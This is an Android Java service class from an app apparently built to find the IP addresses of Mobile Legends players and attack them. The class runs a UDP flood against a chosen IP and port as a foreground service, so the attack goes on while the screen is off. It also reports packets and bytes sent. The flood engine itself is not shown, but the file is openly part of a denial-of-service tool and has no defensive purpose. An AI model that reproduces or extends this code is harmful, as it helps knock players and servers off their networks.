package com.paneer.mlbbipdetect;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

import androidx.core.app.NotificationCompat;

/**
 * Foreground wrapper so the flood keeps running while screen is off.
 */
public class DdosWorkerService extends Service {

    public static final String ACTION_START = "com.paneer.mlbbipdetect.START_FLOOD";
    public static final String ACTION_STOP = "com.paneer.mlbbipdetect.STOP_FLOOD";
    public static final String EXTRA_IP = "ip";
    public static final String EXTRA_PORT = "port";
    public static final String EXTRA_THREADS = "threads";
    public static final String EXTRA_SIZE = "size";
    public static final String BROADCAST_FLOOD = "com.paneer.mlbbipdetect.FLOOD_STATUS";

    private static final String CHANNEL_ID = "mlbb_flood";
    private static final int NOTIF_ID = 1002;

    public static final UdpFloodEngine ENGINE = new UdpFloodEngine();

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;
        String action = intent.getAction();
        if (ACTION_START.equals(action)) {
            String ip = intent.getStringExtra(EXTRA_IP);
            int port = intent.getIntExtra(EXTRA_PORT, 5000);
            int threads = intent.getIntExtra(EXTRA_THREADS, 8);
            int size = intent.getIntExtra(EXTRA_SIZE, 512);
            startFlood(ip, port, threads, size);
        } else if (ACTION_STOP.equals(action)) {
            stopFlood();
            stopSelf();
        }
        return START_STICKY;
    }

    private void startFlood(String ip, int port, int threads, int size) {
        createChannel();
        startForeground(NOTIF_ID, buildNotif("Flooding " + ip + ":" + port));

        ENGINE.setListener(new UdpFloodEngine.Listener() {
            @Override
            public void onStats(long packetsSent, long bytesSent, int activeThreads) {
                Intent i = new Intent(BROADCAST_FLOOD);
                i.putExtra("status", "RUNNING");
                i.putExtra("packets", packetsSent);
                i.putExtra("bytes", bytesSent);
                i.putExtra("threads", activeThreads);
                i.setPackage(getPackageName());
                sendBroadcast(i);
            }

            @Override
            public void onError(String msg) {
                Intent i = new Intent(BROADCAST_FLOOD);
                i.putExtra("status", "ERROR");
                i.putExtra("msg", msg);
                i.setPackage(getPackageName());
                sendBroadcast(i);
            }

            @Override
            public void onStopped() {
                Intent i = new Intent(BROADCAST_FLOOD);
                i.putExtra("status", "STOPPED");
                i.setPackage(getPackageName());
                sendBroadcast(i);
            }
        });

        ENGINE.start(ip, port, threads, size);
    }

    private void stopFlood() {
        ENGINE.stop();
        stopForeground(true);
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "UDP Flood", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotif(String text) {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(getString(R.string.ddos_notification_title))
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_menu_send)
                .setOngoing(true)
                .build();
    }

    @Override
    public void onDestroy() {
        ENGINE.stop();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
